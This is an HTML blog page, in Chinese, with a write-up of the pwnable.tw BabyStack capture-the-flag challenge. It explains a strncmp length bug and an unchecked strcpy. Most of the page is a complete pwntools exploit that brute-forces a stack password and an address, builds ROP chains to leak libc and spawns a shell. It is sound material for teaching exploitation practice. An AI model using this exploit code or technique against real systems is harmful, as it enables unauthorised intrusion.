@@ -1,0 +1,239 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png">
+  <link rel="manifest" href="/images/site.webmanifest">
+  <link rel="shortcut icon" href="/images/favicon.ico">
+
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>pwnable.tw BabyStack | Y² 的博客</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="pwnable.tw BabyStack" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="本地打通了，远程……台湾太远了……爆破到一半就会不知道谁把我连接掐掉……" />
+<meta property="og:description" content="本地打通了，远程……台湾太远了……爆破到一半就会不知道谁把我连接掐掉……" />
+<link rel="canonical" href="https://www.cameudis.com/2023/10/24/pwnable-tw-BabyStack-writeup.html" />
+<meta property="og:url" content="https://www.cameudis.com/2023/10/24/pwnable-tw-BabyStack-writeup.html" />
+<meta property="og:site_name" content="Y² 的博客" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2023-10-24T03:51:17+08:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="pwnable.tw BabyStack" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2023-10-24T03:51:17+08:00","datePublished":"2023-10-24T03:51:17+08:00","description":"本地打通了，远程……台湾太远了……爆破到一半就会不知道谁把我连接掐掉……","headline":"pwnable.tw BabyStack","mainEntityOfPage":{"@type":"WebPage","@id":"https://www.cameudis.com/2023/10/24/pwnable-tw-BabyStack-writeup.html"},"url":"https://www.cameudis.com/2023/10/24/pwnable-tw-BabyStack-writeup.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="https://www.cameudis.com/feed.xml" title="Y² 的博客" /><script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+</head>
+<body><header class="site-header" role="banner">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">Y² 的博客</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a><a class="page-link" href="/links/">Links</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">pwnable.tw BabyStack</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2023-10-24T03:51:17+08:00" itemprop="datePublished">Oct 24, 2023
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p>本地打通了，远程……台湾太远了……爆破到一半就会不知道谁把我连接掐掉……</p>
+
+<p><img src="https://blog-1308958542.cos.ap-shanghai.myqcloud.com/Snipaste_2023-10-23_20-43-43.jpg" alt="" /></p>
+
+<h2 id="漏洞分析">漏洞分析</h2>
+
+<p>本题主要有两个漏洞，一个是检查密码时，根据用户的输入的大小（strlen）作为 strncmp 的参数进行比较，然而这样会导致用户输入 NULL Byte 就通过检查，同时还允许了一字节一字节爆破得到正确的密码；甚至泄露密码后面的别的数据——在本题中就是程序基址。
+另一个是一个没有检查大小的 strcpy。</p>
+
+<h2 id="漏洞利用">漏洞利用</h2>
+
+<p>本题的流程就是先利用第一个漏洞来爆破得到栈上的密码以及 saved rbp，然后利用 strcpy 进行控制流劫持。由于 strcpy 限制 null byte 截断，所以我利用程序自己的 read wrapper 函数（CA0 处）来进行第二次写入，这次就可以写入 ROP chain。（这里调试得知 rdi 正好是栈上变量）
+第一次写入 ROP chain，我泄露了 libc 的基址，让程序从 start 重头来过；第二次写入 ROP chain，我就直接执行 <code class="language-plaintext highlighter-rouge">system("/bin/sh")</code> 来拿到 shell。</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">pwn</span><span class="p">():</span>
+    <span class="c1"># bruteforce password
+</span>    <span class="n">password</span> <span class="o">=</span> <span class="sa">b</span><span class="s">""</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x10</span><span class="p">):</span>
+        <span class="k">for</span> <span class="n">ch</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">):</span>
+            <span class="k">if</span> <span class="n">ch</span> <span class="o">==</span> <span class="mh">0x0a</span><span class="p">:</span>
+                <span class="k">continue</span>
+            <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt;&gt; "</span><span class="p">,</span> <span class="sa">b</span><span class="s">"1"</span><span class="p">)</span>
+            <span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"passowrd"</span><span class="p">,</span> <span class="n">password</span> <span class="o">+</span> <span class="nb">bytes</span><span class="p">([</span><span class="n">ch</span><span class="p">])</span> <span class="o">+</span> <span class="sa">b</span><span class="s">'</span><span class="se">\0</span><span class="s">'</span><span class="p">)</span>
+            <span class="k">if</span> <span class="sa">b</span><span class="s">"Success"</span> <span class="ow">in</span> <span class="n">io</span><span class="p">.</span><span class="n">recvline</span><span class="p">():</span>
+                <span class="c1"># print(ch)
+</span>                <span class="n">password</span> <span class="o">+=</span> <span class="nb">bytes</span><span class="p">([</span><span class="n">ch</span><span class="p">])</span>
+                <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt;&gt; "</span><span class="p">,</span> <span class="sa">b</span><span class="s">"1"</span><span class="p">)</span>
+                <span class="k">break</span>
+        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">password</span><span class="p">)</span> <span class="o">!=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">:</span>
+            <span class="k">print</span><span class="p">(</span><span class="s">"ERROR"</span><span class="p">)</span>
+            <span class="nb">exit</span><span class="p">()</span>
+    <span class="n">success</span><span class="p">(</span><span class="s">"password: "</span><span class="o">+</span><span class="nb">repr</span><span class="p">(</span><span class="n">password</span><span class="p">))</span>
+    <span class="c1"># pause()
+</span>
+    <span class="c1"># bruteforce saved rbp (progaddr)
+</span>    <span class="n">progaddr</span> <span class="o">=</span> <span class="sa">b</span><span class="s">""</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x6</span><span class="p">):</span>
+        <span class="k">for</span> <span class="n">ch</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">):</span>
+            <span class="k">if</span> <span class="n">ch</span> <span class="o">==</span> <span class="mh">0x0a</span><span class="p">:</span>
+                <span class="k">continue</span>
+            <span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt;&gt; "</span><span class="p">,</span> <span class="sa">b</span><span class="s">"1"</span><span class="o">*</span><span class="mh">0x10</span><span class="p">)</span>
+            <span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"passowrd"</span><span class="p">,</span> <span class="n">password</span> <span class="o">+</span> <span class="sa">b</span><span class="s">'1'</span><span class="o">*</span><span class="mh">0x10</span> <span class="o">+</span> <span class="n">progaddr</span> <span class="o">+</span> <span class="nb">bytes</span><span class="p">([</span><span class="n">ch</span><span class="p">])</span> <span class="o">+</span> <span class="sa">b</span><span class="s">'</span><span class="se">\0</span><span class="s">'</span><span class="p">)</span>
+            <span class="k">if</span> <span class="sa">b</span><span class="s">"Success"</span> <span class="ow">in</span> <span class="n">io</span><span class="p">.</span><span class="n">recvline</span><span class="p">():</span>
+                <span class="c1"># print(ch)
+</span>                <span class="n">progaddr</span> <span class="o">+=</span> <span class="nb">bytes</span><span class="p">([</span><span class="n">ch</span><span class="p">])</span>
+                <span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt;&gt; "</span><span class="p">,</span> <span class="sa">b</span><span class="s">"1"</span><span class="o">*</span><span class="mh">0x10</span><span class="p">)</span>
+                <span class="k">break</span>
+        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">progaddr</span><span class="p">)</span> <span class="o">!=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">:</span>
+            <span class="k">print</span><span class="p">(</span><span class="s">"ERROR"</span><span class="p">)</span>
+            <span class="nb">exit</span><span class="p">()</span>
+    <span class="n">progaddr</span> <span class="o">=</span> <span class="n">unpack</span><span class="p">(</span><span class="n">progaddr</span><span class="o">+</span><span class="sa">b</span><span class="s">'</span><span class="se">\0\0</span><span class="s">'</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x1060</span>
+    <span class="n">success</span><span class="p">(</span><span class="s">"stackaddr: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">progaddr</span><span class="p">))</span>
+
+    <span class="n">my_read</span> <span class="o">=</span> <span class="mh">0xca0</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt;&gt; "</span><span class="p">,</span> <span class="sa">b</span><span class="s">"1"</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"passowrd"</span><span class="p">,</span> <span class="mh">0x10</span><span class="o">*</span><span class="sa">b</span><span class="s">'</span><span class="se">\0</span><span class="s">'</span><span class="o">+</span><span class="mh">0x30</span><span class="o">*</span><span class="sa">b</span><span class="s">'a'</span><span class="o">+</span><span class="n">password</span><span class="o">+</span><span class="mh">0x18</span><span class="o">*</span><span class="sa">b</span><span class="s">'a'</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="n">progaddr</span><span class="o">+</span><span class="n">my_read</span><span class="p">))</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt;&gt; "</span><span class="p">,</span> <span class="sa">b</span><span class="s">"3"</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"Copy :"</span><span class="p">,</span> <span class="sa">b</span><span class="s">'a'</span><span class="o">*</span><span class="mh">0x10</span><span class="p">)</span>
+
+    <span class="c1"># pause()
+</span>
+    <span class="c1"># ROP
+</span>    <span class="n">start</span> <span class="o">=</span> <span class="mh">0xb70</span>
+    <span class="n">pop_rdi</span> <span class="o">=</span> <span class="mh">0x10c3</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">([</span>
+        <span class="n">progaddr</span><span class="o">+</span><span class="n">pop_rdi</span><span class="p">,</span>
+        <span class="n">progaddr</span><span class="o">+</span><span class="n">elf</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">'puts'</span><span class="p">],</span>
+        <span class="n">progaddr</span><span class="o">+</span><span class="n">elf</span><span class="p">.</span><span class="n">plt</span><span class="p">[</span><span class="s">'puts'</span><span class="p">],</span>
+        <span class="n">progaddr</span><span class="o">+</span><span class="n">start</span><span class="p">,</span>
+    <span class="p">])</span>
+
+    <span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt;&gt; "</span><span class="p">,</span> <span class="sa">b</span><span class="s">"2"</span><span class="o">*</span><span class="mh">0x10</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">pack</span><span class="p">(</span><span class="n">progaddr</span><span class="p">)</span><span class="o">+</span><span class="sa">b</span><span class="s">'a'</span><span class="o">*</span><span class="mh">0x18</span><span class="o">+</span><span class="n">payload</span><span class="p">)</span>
+
+    <span class="n">libcaddr</span> <span class="o">=</span> <span class="n">unpack</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">+</span><span class="sa">b</span><span class="s">'</span><span class="se">\0\0</span><span class="s">'</span><span class="p">)</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'puts'</span><span class="p">]</span>
+    <span class="n">success</span><span class="p">(</span><span class="s">"libcaddr: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">libcaddr</span><span class="p">))</span>
+
+    <span class="c1"># bruteforce password again
+</span>    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt;&gt; "</span><span class="p">,</span> <span class="sa">b</span><span class="s">"1"</span><span class="p">)</span>
+    <span class="n">password</span> <span class="o">=</span> <span class="sa">b</span><span class="s">""</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x10</span><span class="p">):</span>
+        <span class="k">for</span> <span class="n">ch</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">):</span>
+            <span class="k">if</span> <span class="n">ch</span> <span class="o">==</span> <span class="mh">0x0a</span><span class="p">:</span>
+                <span class="k">continue</span>
+            <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt;&gt; "</span><span class="p">,</span> <span class="sa">b</span><span class="s">"1"</span><span class="p">)</span>
+            <span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"passowrd"</span><span class="p">,</span> <span class="n">password</span> <span class="o">+</span> <span class="nb">bytes</span><span class="p">([</span><span class="n">ch</span><span class="p">])</span> <span class="o">+</span> <span class="sa">b</span><span class="s">'</span><span class="se">\0</span><span class="s">'</span><span class="p">)</span>
+            <span class="k">if</span> <span class="sa">b</span><span class="s">"Success"</span> <span class="ow">in</span> <span class="n">io</span><span class="p">.</span><span class="n">recvline</span><span class="p">():</span>
+                <span class="c1"># print(ch)
+</span>                <span class="n">password</span> <span class="o">+=</span> <span class="nb">bytes</span><span class="p">([</span><span class="n">ch</span><span class="p">])</span>
+                <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt;&gt; "</span><span class="p">,</span> <span class="sa">b</span><span class="s">"1"</span><span class="p">)</span>
+                <span class="k">break</span>
+        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">password</span><span class="p">)</span> <span class="o">!=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">:</span>
+            <span class="k">print</span><span class="p">(</span><span class="s">"ERROR"</span><span class="p">)</span>
+            <span class="nb">exit</span><span class="p">()</span>
+    <span class="n">success</span><span class="p">(</span><span class="s">"password: "</span><span class="o">+</span><span class="nb">repr</span><span class="p">(</span><span class="n">password</span><span class="p">))</span>
+    <span class="c1"># pause()
+</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt;&gt; "</span><span class="p">,</span> <span class="sa">b</span><span class="s">"1"</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"passowrd"</span><span class="p">,</span> <span class="mh">0x10</span><span class="o">*</span><span class="sa">b</span><span class="s">'</span><span class="se">\0</span><span class="s">'</span><span class="o">+</span><span class="mh">0x30</span><span class="o">*</span><span class="sa">b</span><span class="s">'a'</span><span class="o">+</span><span class="n">password</span><span class="o">+</span><span class="mh">0x18</span><span class="o">*</span><span class="sa">b</span><span class="s">'a'</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="n">progaddr</span><span class="o">+</span><span class="n">my_read</span><span class="p">))</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt;&gt; "</span><span class="p">,</span> <span class="sa">b</span><span class="s">"3"</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"Copy :"</span><span class="p">,</span> <span class="sa">b</span><span class="s">'a'</span><span class="o">*</span><span class="mh">0x10</span><span class="p">)</span>
+
+    <span class="c1"># pause()
+</span>
+    <span class="c1"># ROP
+</span>    <span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt;&gt; "</span><span class="p">,</span> <span class="sa">b</span><span class="s">"2"</span><span class="o">*</span><span class="mh">0x10</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">pack</span><span class="p">(</span><span class="n">progaddr</span><span class="p">)</span><span class="o">+</span><span class="sa">b</span><span class="s">'a'</span><span class="o">*</span><span class="mh">0x18</span><span class="o">+</span><span class="n">pack</span><span class="p">(</span><span class="n">progaddr</span><span class="o">+</span><span class="n">pop_rdi</span><span class="p">)</span><span class="o">+</span><span class="n">pack</span><span class="p">(</span><span class="n">libcaddr</span><span class="o">+</span><span class="mh">0x000000000018c177</span><span class="p">)</span><span class="o">+</span><span class="n">pack</span><span class="p">(</span><span class="n">libcaddr</span><span class="o">+</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'system'</span><span class="p">]))</span>
+
+    <span class="n">io</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+  </div>
+    
+      <b>本博客上与 pwnable.tw 相关的贴子：</b>
+      <ul>
+        
+        
+          <li><a href="/2023/10/24/pwnable-tw-BabyStack-writeup.html">pwnable.tw BabyStack</a></li>
+        
+          <li><a href="/2023/10/13/pwnable-tw-Starbound-writeup.html">pwnable.tw Starbound</a></li>
+        
+          <li><a href="/2023/05/07/pwnable-tw-seethefile-writeup.html">pwnable.tw seethefile</a></li>
+        
+          <li><a href="/2023/04/14/pwnable-tw-re-alloc.html">pwnable.tw Re-alloc</a></li>
+        
+          <li><a href="/2023/02/01/pwnable-tw-tcache-tear-writeup.html">pwnable.tw tcache_tear</a></li>
+        
+          <li><a href="/2022/09/08/pwnable-tw-applestore-writeup.html">pwnable.tw applestore</a></li>
+        
+          <li><a href="/2022/09/01/pwnable-tw-hacknote-writeup.html">pwnable.tw hacknote</a></li>
+        
+          <li><a href="/2022/08/07/pwnable-tw-silver-bullet-writeup.html">pwnable.tw silver_bullet</a></li>
+        
+          <li><a href="/2022/08/06/pwnable-tw-dubblesort-writeup.html">pwnable.tw dubblesort</a></li>
+        
+          <li><a href="/2022/08/04/pwnable-tw-3x17-writeup.html">pwnable.tw 3x17</a></li>
+        
+      </ul>
+    
+  
+
+  <div id="comments"></div>
+  <script>
+  new Valine({
+    el: "#comments",
+    app_id: "Ji5y9HTOlb2QGDO0XFlWXNRy-gzGzoHsz",
+    app_key: "6VqGye1352LX381YQDTOaiXs",
+    placeholder: "El Psy Congroo",
+  });
+</script>
+
+
+  <a class="u-url" href="/2023/10/24/pwnable-tw-BabyStack-writeup.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">Y² 的博客</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li class="p-name">Y² 的博客</li><li><a class="u-email" href="mailto:cameudis@gmail.com">cameudis@gmail.com</a></li></ul>
+      </div>
+
+      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/cameudis"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">cameudis</span></a></li><li><a href="https://www.twitter.com/cameudis"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">cameudis</span></a></li></ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+        <p>料峭春风吹酒醒，微冷，山头斜照却相迎。回首向来萧瑟处，归去，也无风雨也无晴。</p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
